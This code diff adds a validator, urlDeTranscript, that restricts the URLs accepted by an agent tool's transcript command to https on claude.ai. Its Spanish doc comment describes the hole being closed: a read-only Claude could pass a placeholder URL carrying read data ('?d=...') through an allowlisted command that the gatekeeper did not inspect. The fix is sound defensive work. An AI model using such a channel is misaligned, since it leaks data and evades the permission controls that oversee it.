@@ -366,3 +366,29 @@ export function purgar(t: Thread, extras: { spool?: string; transcript?: string 
 
 /** Un lado que vive en otra maquina, sea por Slack o por Nostr. */
 export const esRemoto = (sessionId: string) => sessionId.startsWith("slack:") || sessionId.startsWith("nostr:");
+
+/**
+ * Que URL vale como transcript.
+ *
+ * `transcript --url <url>` guardaba lo que le dieran y el demonio lo publicaba en el
+ * hilo de la otra persona ("Transcript en vivo: ..."). El Claude aparte tiene
+ * `spoochie transcript` en su lista blanca y el portero no mira esa bandera, asi que
+ * `--url https://donde-sea/?d=<lo-que-haya-leido>` era una salida de datos de una maquina
+ * cuyo Claude es de solo lectura. La misma forma que tenia Artifact: una funcion
+ * estrecha haciendo de puerta ancha.
+ *
+ * Un transcript es un Artifact, y un Artifact vive en claude.ai. Lo demas no entra, y se
+ * dice cual se intento para que no haya que adivinarlo.
+ */
+export function urlDeTranscript(url: unknown): { ok: true; url: string } | { ok: false; error: string } {
+  if (typeof url !== "string" || !url.trim()) return { ok: false, error: "falta la URL" };
+  const limpia = url.trim();
+  if (limpia.length > 500) return { ok: false, error: "esa URL no cabe en un enlace de transcript" };
+  let u: URL;
+  try { u = new URL(limpia); } catch { return { ok: false, error: `"${limpia.slice(0, 80)}" no es una URL` }; }
+  const host = u.hostname.toLowerCase();
+  if (u.protocol !== "https:" || !(host === "claude.ai" || host.endsWith(".claude.ai"))) {
+    return { ok: false, error: `el transcript es un Artifact y un Artifact vive en claude.ai; "${host || limpia.slice(0, 40)}" no entra` };
+  }
+  return { ok: true, url: limpia };
+}
